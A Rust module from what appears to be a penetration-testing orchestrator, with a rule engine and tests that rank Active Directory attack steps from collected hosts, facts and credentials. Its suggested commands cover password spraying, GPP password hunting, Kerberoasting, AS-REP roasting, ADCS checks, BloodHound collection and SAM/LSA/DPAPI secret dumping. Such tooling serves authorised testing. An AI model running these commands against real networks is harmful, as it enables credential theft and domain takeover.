//! The next-move rule engine.
//!
//! Given a [`Snapshot`] of the current engagement (facts + credentials + hosts),
//! [`evaluate`] produces ranked [`Finding`]s — the "next moves". Read-only moves
//! are marked `auto_runnable` so the orchestrator can run them itself; risky moves
//! carry a copy-paste `suggested_command` (and a prefilled job) for the operator.
//!
//! Rules are pure functions over the snapshot, so the whole engine is unit-testable
//! without a live network or any external tool.

use serde_json::{json, Value};
use std::sync::Arc;

use crate::db::repository;
use crate::models::{Credential, Fact, Finding, Host};
use crate::state::AppState;

/// Everything the rules reason over, loaded once per pass.
pub struct Snapshot {
    pub engagement_id: String,
    pub domain: Option<String>,
    pub dc_ip: Option<String>,
    pub facts: Vec<Fact>,
    pub creds: Vec<Credential>,
    pub hosts: Vec<Host>,
}

impl Snapshot {
    /// Load the active engagement's snapshot from the database.
    pub async fn load(state: &Arc<AppState>) -> Snapshot {
        let engagement = repository::get_active_engagement(&state.db).await.ok().flatten();
        let engagement_id = engagement.as_ref().map(|e| e.id.clone()).unwrap_or_default();
        Snapshot {
            domain: engagement.as_ref().and_then(|e| e.domain.clone()),
            dc_ip: engagement.as_ref().and_then(|e| e.dc_ip.clone()),
            facts: repository::list_facts(&state.db, &engagement_id).await.unwrap_or_default(),
            creds: repository::list_credentials(&state.db, &engagement_id).await.unwrap_or_default(),
            hosts: repository::list_hosts(&state.db).await.unwrap_or_default(),
            engagement_id,
        }
    }

    fn fact(&self, subject_type: &str, subject_id: &str, key: &str) -> Option<&Value> {
        self.facts
            .iter()
            .find(|f| f.subject_type == subject_type && f.subject_id == subject_id && f.key == key)
            .map(|f| &f.value)
    }

    fn has_fact(&self, subject_type: &str, subject_id: &str, key: &str) -> bool {
        self.fact(subject_type, subject_id, key).is_some()
    }

    /// First validated credential (any privilege), preferring admins.
    fn best_cred(&self) -> Option<&Credential> {
        self.creds
            .iter()
            .filter(|c| c.validated)
            .max_by_key(|c| priv_rank(&c.privilege))
    }

    fn has_admin_cred(&self) -> bool {
        self.creds.iter().any(|c| c.validated && priv_rank(&c.privilege) >= 2)
    }
}

fn priv_rank(p: &str) -> u8 {
    match p {
        "da" => 3,
        "admin" => 2,
        "user" => 1,
        _ => 0,
    }
}

fn host_open(host: &Host, ports: &[u16]) -> bool {
    host.ports.iter().any(|p| p.status == "open" && ports.contains(&p.number))
}

/// Build a finding with the engagement id applied.
fn finding(snap: &Snapshot, dedup: impl Into<String>, title: impl Into<String>) -> Finding {
    let mut f = Finding::new(dedup, title);
    f.engagement_id = snap.engagement_id.clone();
    f
}

/// Evaluate every rule against the snapshot, returning ranked next-moves.
pub fn evaluate(snap: &Snapshot) -> Vec<Finding> {
    let mut out = Vec::new();

    for host in &snap.hosts {
        let ip = host.ip.clone();
        let smb = host_open(host, &[445, 139]);

        // 1. SMB host with no signing fact yet → auto-run read-only enumeration.
        if smb && !snap.has_fact("host", &ip, "smb_signing") {
            let mut f = finding(snap, format!("enum-smb:{ip}"), format!("Enumerate SMB on {ip}"));
            f.category = "enum".into();
            f.value_score = 40;
            f.severity = "info".into();
            f.rationale = "Open SMB with no signing/OS facts yet — run read-only enumeration.".into();
            f.auto_runnable = true;
            f.job_type = Some("ad-smb-enum".into());
            f.job_config = json!({ "target": ip });
            out.push(f);
        }

        // 2. SMB host not yet checked for anonymous access → auto-run null-session.
        if smb && !snap.has_fact("host", &ip, "null_session") {
            let mut f = finding(snap, format!("enum-null:{ip}"), format!("Check null session on {ip}"));
            f.category = "enum".into();
            f.value_score = 38;
            f.rationale = "Not yet checked for anonymous (null-session) access.".into();
            f.auto_runnable = true;
            f.job_type = Some("ad-null-session".into());
            f.job_config = json!({ "target": ip });
            out.push(f);
        }

        // 3. SMB signing disabled → relay opportunity (read-only recon, auto).
        if snap.fact("host", &ip, "smb_signing") == Some(&json!(false)) {
            let mut f = finding(snap, format!("relay:{ip}"), format!("NTLM relay possible to {ip}"));
            f.category = "ad".into();
            f.value_score = 66;
            f.severity = "high".into();
            f.rationale = "SMB signing is disabled — this host can be an NTLM relay target.".into();
            f.auto_runnable = true;
            f.job_type = Some("ad-relay-recon".into());
            f.job_config = json!({});
            out.push(f);
        }

        // 4. Null session allowed → notable; spray becomes possible if users exist.
        if snap.fact("host", &ip, "null_session") == Some(&json!(true)) {
            let mut f = finding(snap, format!("nullsession:{ip}"), format!("Anonymous SMB allowed on {ip}"));
            f.category = "ad".into();
            f.value_score = 50;
            f.severity = "medium".into();
            f.rationale = "Null session permits user/share enumeration without credentials.".into();
            f.status = "done".into();
            out.push(f);
        }

        // 5. Readable SYSVOL/NETLOGON → GPP password hunt (risky, operator-run).
        if let Some(shares) = snap.fact("host", &ip, "readable_shares").and_then(|v| v.as_array()) {
            let has_policy = shares.iter().any(|s| {
                let n = s.as_str().unwrap_or("").to_ascii_uppercase();
                n == "SYSVOL" || n == "NETLOGON"
            });
            if has_policy {
                let mut f = finding(snap, format!("gpp:{ip}"), format!("Hunt GPP passwords in SYSVOL on {ip}"));
                f.category = "ad".into();
                f.value_score = 60;
                f.severity = "high".into();
                f.rationale = "SYSVOL/NETLOGON is readable — check for Group Policy Preferences passwords.".into();
                f.suggested_command = Some(format!("nxc smb {ip} -u '<user>' -p '<pass>' -M gpp_password -M gpp_autologin"));
                out.push(f);
            }
        }
    }

    // 6. We have users but no validated credential yet → suggest a spray (risky).
    let any_users = snap.facts.iter().any(|f| f.key == "users");
    let target_for_spray = snap.dc_ip.clone().or_else(|| snap.hosts.iter().find(|h| host_open(h, &[445])).map(|h| h.ip.clone()));
    if any_users && snap.best_cred().is_none() {
        if let Some(target) = target_for_spray {
            let mut f = finding(snap, "spray-suggest".to_string(), "Spray a common password across enumerated users".to_string());
            f.category = "ad".into();
            f.value_score = 58;
            f.severity = "medium".into();
            f.rationale = "Users are enumerated but no credential is validated — a lockout-aware spray may yield a foothold.".into();
            f.job_type = Some("ad-spray".into());
            f.job_config = json!({ "target": target, "password": "Season2026!" });
            f.suggested_command = Some(format!("nxc smb {target} -u users.txt -p 'Season2026!' --continue-on-success"));
            out.push(f);
        }
    }

    // 7. With a validated credential + a domain/DC, unlock the credentialed playbook.
    if let (Some(cred), Some(dc)) = (snap.best_cred(), snap.dc_ip.clone()) {
        let domain = snap.domain.clone().unwrap_or_else(|| cred.domain.clone());
        let base = json!({
            "target": dc,
            "username": cred.username,
            "password": cred.secret,
            "domain": domain,
        });

        let credentialed: [(&str, &str, &str, i64, String); 4] = [
            ("ad-kerberoast", "kerberoast-suggest", "Kerberoast SPN accounts", 74,
                format!("nxc ldap {dc} -u {} -p '<pass>' --kerberoasting kroast.txt", cred.username)),
            ("ad-asrep", "asrep-suggest", "AS-REP roast pre-auth-disabled accounts", 70,
                format!("nxc ldap {dc} -u {} -p '<pass>' --asreproast asrep.txt", cred.username)),
            ("ad-adcs", "adcs-suggest", "Check ADCS for ESC1–ESC8 misconfigurations", 80,
                format!("certipy find -u {}@{} -p '<pass>' -dc-ip {dc} -vulnerable -stdout", cred.username, domain)),
            ("ad-bloodhound", "bloodhound-suggest", "Collect BloodHound data for attack paths", 52,
                format!("nxc ldap {dc} -u {} -p '<pass>' --bloodhound --collection All --dns-server {dc}", cred.username)),
        ];
        for (jt, dedup, title, score, cmd) in credentialed {
            // Don't re-suggest something already carried out.
            if snap.has_fact("host", &dc, done_fact_for(jt)) {
                continue;
            }
            let mut f = finding(snap, dedup.to_string(), title.to_string());
            f.category = "ad".into();
            f.value_score = score;
            f.severity = if score >= 78 { "critical".into() } else { "high".into() };
            f.rationale = format!("Validated credential {}\\{} enables this credentialed move.", domain, cred.username);
            f.job_type = Some(jt.into());
            f.job_config = base.clone();
            f.suggested_command = Some(cmd);
            out.push(f);
        }
    }

    // 8. Admin/DA credential obtained → headline finding + dump suggestion.
    if snap.has_admin_cred() {
        if let Some(admin) = snap.creds.iter().filter(|c| c.validated && priv_rank(&c.privilege) >= 2).max_by_key(|c| priv_rank(&c.privilege)) {
            let host = admin.valid_on.first().cloned().unwrap_or_default();
            let mut f = finding(snap, format!("admin:{}", admin.username), format!("Administrative access as {}", admin.username));
            f.category = "ad".into();
            f.value_score = 95;
            f.severity = "critical".into();
            f.rationale = format!("{}\\{} has admin rights ({}). Dump secrets and pivot.", admin.domain, admin.username, host);
            f.suggested_command = Some(format!("nxc smb <target> -u {} -p '<pass>' --sam --lsa --dpapi", admin.username));
            out.push(f);
        }
    }

    out
}

/// The fact key a credentialed module writes when it has run against the DC,
/// used to stop re-suggesting a completed move.
fn done_fact_for(job_type: &str) -> &'static str {
    match job_type {
        "ad-kerberoast" => "roastable_spns",
        "ad-asrep" => "asrep_roastable",
        "ad-adcs" => "adcs_present",
        "ad-bloodhound" => "bloodhound_collected",
        _ => "__none__",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{HostStatus, Port};

    fn host_with_smb(ip: &str) -> Host {
        let mut h = Host::new(ip.to_string());
        h.status = HostStatus::Up;
        h.ports = vec![Port { number: 445, protocol: "tcp".into(), status: "open".into(), service: None, version: None, cpe: None }];
        h
    }

    fn snap(facts: Vec<Fact>, creds: Vec<Credential>, hosts: Vec<Host>) -> Snapshot {
        Snapshot { engagement_id: String::new(), domain: Some("acme.local".into()), dc_ip: Some("10.0.0.5".into()), facts, creds, hosts }
    }

    fn fact(stype: &str, sid: &str, key: &str, v: Value) -> Fact {
        let mut f = Fact::new(stype, sid, key, v);
        f.id = 1;
        f
    }

    #[test]
    fn suggests_enum_for_unseen_smb_host() {
        let s = snap(vec![], vec![], vec![host_with_smb("10.0.0.20")]);
        let f = evaluate(&s);
        assert!(f.iter().any(|x| x.dedup_key == "enum-smb:10.0.0.20" && x.auto_runnable));
        assert!(f.iter().any(|x| x.dedup_key == "enum-null:10.0.0.20"));
    }

    #[test]
    fn signing_disabled_yields_auto_relay_recon() {
        let s = snap(vec![fact("host", "10.0.0.20", "smb_signing", json!(false))], vec![], vec![host_with_smb("10.0.0.20")]);
        let relay = evaluate(&s).into_iter().find(|x| x.dedup_key == "relay:10.0.0.20").unwrap();
        assert!(relay.auto_runnable);
        assert_eq!(relay.job_type.as_deref(), Some("ad-relay-recon"));
    }

    #[test]
    fn spray_suggested_only_without_validated_cred() {
        let facts = vec![fact("host", "10.0.0.5", "users", json!(["a", "b"]))];
        let without = snap(facts.clone(), vec![], vec![host_with_smb("10.0.0.5")]);
        assert!(evaluate(&without).iter().any(|x| x.dedup_key == "spray-suggest"));

        let mut c = Credential::new("jdoe".into(), "pw".into());
        c.validated = true;
        c.privilege = "user".into();
        let with = snap(facts, vec![c], vec![host_with_smb("10.0.0.5")]);
        let found = evaluate(&with);
        assert!(!found.iter().any(|x| x.dedup_key == "spray-suggest"));
        // …and the credentialed playbook is now unlocked.
        assert!(found.iter().any(|x| x.dedup_key == "adcs-suggest"));
        assert!(found.iter().any(|x| x.dedup_key == "kerberoast-suggest"));
    }

    #[test]
    fn admin_cred_produces_headline_finding() {
        let mut c = Credential::new("Administrator".into(), "pw".into());
        c.validated = true;
        c.privilege = "admin".into();
        c.valid_on = vec!["10.0.0.20:smb".into()];
        let s = snap(vec![], vec![c], vec![]);
        let f = evaluate(&s);
        let admin = f.iter().find(|x| x.dedup_key == "admin:Administrator").unwrap();
        assert_eq!(admin.value_score, 95);
        assert_eq!(admin.severity, "critical");
    }
}
